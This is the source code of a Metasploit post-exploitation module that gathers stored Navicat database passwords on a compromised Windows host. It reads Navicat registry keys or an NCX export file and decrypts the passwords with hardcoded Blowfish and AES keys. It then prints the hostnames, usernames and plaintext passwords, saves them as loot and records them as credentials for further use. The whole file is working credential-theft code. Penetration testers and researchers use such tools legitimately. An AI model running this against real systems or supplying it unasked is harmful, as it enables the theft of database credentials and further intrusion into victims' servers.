##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# @blurbdust based this code off of https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
# and https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/enum_ms_product_keys.rb
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::File
  # secret_key = Digest::SHA1.digest('3DC5CA39')
  SECRET_KEY = "B\xCE\xB2q\xA5\xE4X\xB7J\xEA\x93\x94y\"5C\x91\x873@".freeze
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Navicat Passwords',
        'Description' => %q{ This module will find and decrypt stored Navicat passwords },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://github.com/HyperSine/how-does-navicat-encrypt-password'],
          [ 'URL', 'https://blog.kali-team.cn/Metasploit-Navicat-fbc1390cf57c40b5b576584c48b8e125']
        ],
        'Author' => [
          'HyperSine', # Research and PoC
          'Kali-Team <kali-team[at]qq.com>' # MSF module
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter', 'shell'],
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options(
      [
        OptString.new('NCX_PATH', [ false, 'Specify the path of the NCX export file (e.g. connections.ncx).']),
      ]
    )
  end

  def blowfish_encrypt(data = "\xFF" * 8)
    cipher = OpenSSL::Cipher.new('bf-ecb').encrypt
    cipher.padding = 0
    cipher.key_len = SECRET_KEY.length
    cipher.key = SECRET_KEY
    cipher.update(data) << cipher.final
  end

  def blowfish_decrypt(text)
    cipher = OpenSSL::Cipher.new('bf-cbc').decrypt
    cipher.padding = 0
    cipher.key_len = SECRET_KEY.length
    cipher.key = SECRET_KEY
    cipher.iv = "\x00" * 8
    cipher.update(text) + cipher.final
  end

  def strxor(str, second)
    str.bytes.zip(second.bytes).map { |a, b| (a ^ b).chr }.join
  end

  def decrypt_navicat11(encrypted_data)
    password = ''
    return password unless encrypted_data

    iv = blowfish_encrypt
    ciphertext = [encrypted_data].pack('H*')
    cv = iv
    full_round, left_length = ciphertext.length.divmod(8)

    if full_round > 0
      for i in 0..full_round - 1 do
        t = blowfish_decrypt(ciphertext[i * 8, 8])
        t = strxor(t, cv)
        password += t
        cv = strxor(cv, ciphertext[i * 8, 8])
      end
    end

    if left_length > 0
      cv = blowfish_encrypt(cv)
      test_value = strxor(ciphertext[8 * full_round, left_length], cv[0, left_length])
      password += test_value
    end

    password
  end

  def decrypt_navicat_ncx(ciphertext)
    ciphertext = [ciphertext].pack('H*')
    aes = OpenSSL::Cipher.new('aes-128-cbc')
    aes.decrypt
    aes.key = 'libcckeylibcckey'
    aes.padding = 0
    aes.iv = 'libcciv libcciv '
    aes.update(ciphertext)
  end

  def navicat_store_config(config)
    if %i[hostname service_name port username].any? { |e| config[e].blank? } || config[:password].nil?
      vprint_warning('Key data is empty, skip saving service credential')
      return # If any of these fields are nil or are empty (with the exception of the password field which can be empty),
      # then we shouldn't proceed, as we don't have enough info to store a credential which someone could actually
      # use against a target.
    end

    service_data = {
      address: config[:hostname],
      port: config[:port],
      service_name: config[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: refname,
      private_type: :password,
      private_data: config[:password],
      username: config[:username],
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)
    create_credential_and_login(credential_data)
  end

  def parse_xml(data)
    mxml = REXML::Document.new(data).root
    result = []
    mxml.elements.to_a('//Connection').each do |node|
      host = node.attributes['Host']
      port = node.attributes['Port']
      proto = node.attributes['ConnType']
      username = node.attributes['UserName']
      name = node.attributes['ConnectionName']
      epassword = node.attributes['Password']
      password = decrypt_navicat_ncx(epassword)
      result << {
        name: name,
        protocol: proto.downcase,
        hostname: host,
        port: port,
        username: username,
        password: password || epassword
      }
    end
    print_and_save(result)
    return result
  end

  def get_reg
    reg_keys = Hash.new

    reg_keys['mysql'] = 'HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers'
    reg_keys['mariadb'] = 'HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers'
    reg_keys['mongodb'] = 'HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers'
    reg_keys['mssql'] = 'HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers'
    reg_keys['oracle'] = 'HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers'
    reg_keys['postgres'] = 'HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers'
    reg_keys['sqlite'] = 'HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers'
    result = []
    reg_keys.each_pair do |db_name, reg_key|
      subkeys = registry_enumkeys(reg_key)
      next if subkeys.nil?

      subkeys.each do |subkey|
        enc_pwd_value = registry_getvaldata("#{reg_key}\\#{subkey}", 'Pwd')
        next if enc_pwd_value.nil?

        username_value = registry_getvaldata("#{reg_key}\\#{subkey}", 'UserName')
        port_value = registry_getvaldata("#{reg_key}\\#{subkey}", 'Port')
        host_value = registry_getvaldata("#{reg_key}\\#{subkey}", 'Host')

        pwd_value = decrypt_navicat11(enc_pwd_value)
        result << {
          name: subkey,
          protocol: db_name,
          hostname: host_value,
          port: port_value,
          username: username_value,
          password: pwd_value || enc_pwd_value
        }
      end
    end
    print_and_save(result)
    return result
  end

  def print_and_save(results)
    columns = [
      'Name',
      'Protocol',
      'Hostname',
      'Port',
      'Username',
      'Password',
    ]
    tbl = Rex::Text::Table.new(
      'Header' => 'Navicat Sessions',
      'Columns' => columns
    )
    results.each do |item|
      tbl << item.values
      config = {
        name: item[:name],
        hostname: item[:hostname],
        service_name: item[:protocol],
        port: item[:port].nil? ? '' : item[:port],
        username: item[:username],
        password: item[:password]
      }
      navicat_store_config(config)
    end
    print_line(tbl.to_s)
    if tbl.rows.count > 0
      path = store_loot('host.navicat_session', 'text/plain', session, tbl, 'navicat_sessions.txt', 'Navicat Sessions')
      print_good("Session info stored in: #{path}")
    end
  end

  def run
    print_status('Gathering Navicat password information.')
    if datastore['NCX_PATH'].present?
      ncx_path = datastore['NCX_PATH']
      print_status("Looking for #{ncx_path}")
      begin
        if file_exist?(ncx_path)
          condata = read_file(ncx_path) || ''
          fail_with(Failure::Unknown, "The file #{ncx_path} could not be read") if condata.empty?

          loot_path = store_loot('navicat.creds', 'text/xml', session, condata, ncx_path)
          print_good("navicat.ncx saved to #{loot_path}")
          parse_xml(condata)
          print_status("Finished processing #{ncx_path}")
        end
      rescue Rex::Post::Meterpreter::RequestError
        fail_with(Failure::Unknown, "The file #{ncx_path} either could not be read or does not exist")
      end
    else
      get_reg
      print_status('Finished processing from the registry')
    end
  end

end
